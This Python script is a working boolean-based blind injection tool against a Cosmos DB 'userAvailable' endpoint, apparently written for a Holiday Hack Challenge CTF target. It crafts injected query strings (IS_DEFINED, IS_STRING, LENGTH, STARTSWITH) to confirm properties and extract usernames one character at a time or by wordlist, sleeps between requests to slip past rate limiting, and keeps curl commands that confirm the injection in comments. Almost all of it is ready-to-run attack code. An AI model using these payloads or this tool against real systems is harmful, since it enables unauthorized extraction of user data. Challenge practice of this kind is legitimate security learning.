#!/usr/bin/env python3

'''
Cosmos DB SQL Boolean-Based Blind Injection
Python script to find usernames in the database by hitting a vulnerable
query parameter that returns a boolean value indicating if the SQL query
is successful.
'''

import requests
import time
import argparse


# Target URL
BASE_URL = "https://hhc25-smartgnomehack-prod.holidayhackchallenge.com/userAvailable"

def send_request(payload: str) -> bool:
    '''
    Sends a request to the server with the given SQL script payload and
    performs a boolean check of the response to determine if the payload
    was succesful.
    
    :param payload: the payload to submit
    :type payload: str
    :return: 'true' if the response indicates a successful check
    :rtype: bool
    '''
    # print(f"\n[+] Sending payload: {payload}")
    params = {
        "username": payload,
    }
    
    # Send request
    response = requests.get(BASE_URL, params=params)
    # print(f"[+] Response: {response.text}")

    # Sleep to bypass rate limiting
    time.sleep(0.5)

    # Interpret response
    return '"available":false' in response.text

def check_exists(propname: str) -> bool:
    '''
    Checks if the given property exists in the database.
    
    :param propname: the name of the property to check
    :type propname: str
    :return: 'true' if the property exists in the database
    :rtype: bool
    '''
    # Construct payload
    payload = f'" OR IS_DEFINED(c.{propname}) OR "'
    # Send payload and check response
    return send_request(payload)

def check_type(propname: str, type: str) -> bool:
    '''
    Checks if the given property is of the given type.
    
    :param propname: the name of the property to check
    :type propname: str
    :param type: the type to check (e.g. "STRING", "NUMBER", "ARRAY", etc.)
    :type type: str
    :return: 'true' if the property is of the given type
    :rtype: bool
    '''
    # Construct payload
    payload = f'" OR IS_{type}(c.{propname}) OR "'
    # Send payload and check response
    return send_request(payload)

def check_length(propname: str, length: int) -> int:
    '''
    Determines the length of the value associated to the given property.
    
    :param propname: the name of the property to check
    :type propname: str
    :param length: the length to check
    :type length: int
    :return: 'true' if the property value has the given length
    :rtype: int
    '''
    # Construct payload
    payload = f'" OR LENGTH(c.{propname}) = {length} OR "'
    # Send payload and check response
    return send_request(payload)

# def check_char(propname: str, position: int, char: str) -> bool:
#     '''
#     Checks if the given character exists in the given property value at the position sepcified.
    
#     :param propname: the name of the property to check
#     :type propname: str
#     :param position: the index in the property value to check
#     :type position: int
#     :param char: the character to check
#     :type char: str
#     :return: 'true' if the given character matches the given position in the property value
#     :rtype: bool
#     '''
#     # Construct payload
#     payload = f'" OR SUBSTRING(c.{propname},{position},1)=\'{char}\' OR "'
#     # Send payload and check response
#     return send_request(payload)

def check_value(propname: str, value: str) -> bool:
    '''
    Instead of checking each characer at a time, checking for prefix matching is faster.
    
    :param propname: the name of the property to check
    :type propname: str
    :param value: the index in the property value to check
    :type value: str
    :return: 'true' if the given substring matches the beginning of the property value
    :rtype: bool
    '''
    # Construct payload
    payload = f'" OR STARTSWITH(c.{propname},\'{value}\') OR "'
    # Send payload and check response
    return send_request(payload)

def extract_property(db_property: str):
    """
    Extracts the value of the given property for all users in the database using blind SQLi techniques.
    
    :param db_property: the name of the property to extract
    :type db_property: str
    """
    # Check that the given property exists
    print(f"\n[+] Checking if property \"{db_property}\" exists")
    if check_exists(db_property):
        print(f"[+] Property \"{db_property}\" exists in the database.")
    else:
        print(f"[-] Property \"{db_property}\" does not exist in the database.")
        exit(1)

    # Check that the given property is a string
    print(f"\n[+] Checking if property \"{db_property}\" is a string")
    if check_type(db_property, "STRING"):
        print(f"[+] Property \"{db_property}\" is a string.")
    else:
        print(f"[-] Property \"{db_property}\" is not a string.")
        exit(1)

    # Character set to test
    charset = "abcdefghijklmnopqrstuvwxyz-_."

    # Max length of username to extract
    MAX_LENGTH = 30

    # Result accumulator
    extracted = ""

    # Determine property value length
    print(f"\n[+] Checking property \"{db_property}\" value length")
    proplength = 0
    for length in range(0, MAX_LENGTH + 1):
        if check_length(db_property, length):
            proplength = length
            break
    if proplength > 0:
        print(f"[+] Length of \"{db_property}\" value: {proplength}")
    else:
        print(f"[-] Unable to determine \"{db_property}\" value length.")
        exit(1)

    # Extraction loop
    print(f"\n[+] Extracting \"{db_property}\" property value")

    # NOTE:
    # Instead of checking each character at a time, we should use prefix matching,
    # which is faster and more reliable if there are multiple usernames as you may
    # match one character from one username and another character from another
    # username, which would cause the character-by-character approach to not
    # provide accurate results.
    # for pos in range(0, proplength + 1):
    #     found = False
    #     for ch in charset:
    #         if check_char(db_property, pos, ch):
    #             extracted += ch
    #             print(f"[*] Found character at position {pos}: {ch}")
    #             found = True
    #             break
    #     if not found:
    #         print(f"[-] No match at position {pos}, assuming end of string.")
    #         break

    for pos in range(0, proplength + 1):
        found = False
        for ch in charset:
            newvalue = extracted + ch
            if check_value(db_property, newvalue):
                extracted = newvalue
                print(f"[*] Found character at position {pos}: {ch}")
                found = True
                break
        if not found:
            print(f"[-] No match at position {pos}, assuming end of string.")
            break

    print(f"\n[+] Extracted \"{db_property}\" property value: {extracted}")

def check_wordlist(db_property: str, wordlist: str):
    """
    Checks the given wordlist for matches against the given property value using blind SQLi techniques.
    """
    print(f"\n[+] Checking wordlist: {wordlist}")
    with open(wordlist) as f:
        found = False
        for line in f:
            username = line.strip()
            print(f"{username}")
            # print(".", end="")
            if check_value(db_property, username):
                print(f"[+] Found username: {username}\n")
                found = True
        if not found:
            print("\n[-] Unable to find any matching username from wordlist.")

def main():
    """
    Main entry point for the script.
    """
    parser = argparse.ArgumentParser(
        description="Cosmos DB Blind SQLi tool"
    )

    parser.add_argument(
        "-m", "--mode",
        choices=["wordlist", "extract"],
        default="wordlist",
        help="Mode: wordlist (default) or extract"
    )

    parser.add_argument(
        "-w", "--wordlist",
        # default = "john-the-ripper.txt"
        default="usernames.txt",
        help="Wordlist file (default: usernames.txt)"
    )

    parser.add_argument(
        "-p", "--property",
        # From initial analysis, it was found that the property name is "username":
        # curl "${BASE_URL}?username=\"%20OR%20IS_DEFINED(c.username)%20OR%20\""
        # {"available":false}
        #
        # And was confirmed the property value is a String:
        # curl "${BASE_URL}?username=\"%20OR%20IS_STRING(c.username)%20OR%20\""
        # {"available":false}
        default="username",
        help="DB property name (default: username)"
    )

    args = parser.parse_args()

    if args.mode == "extract":
        extract_property(args.property)
    else:
        check_wordlist(args.property, args.wordlist)


if __name__ == "__main__":
    main()
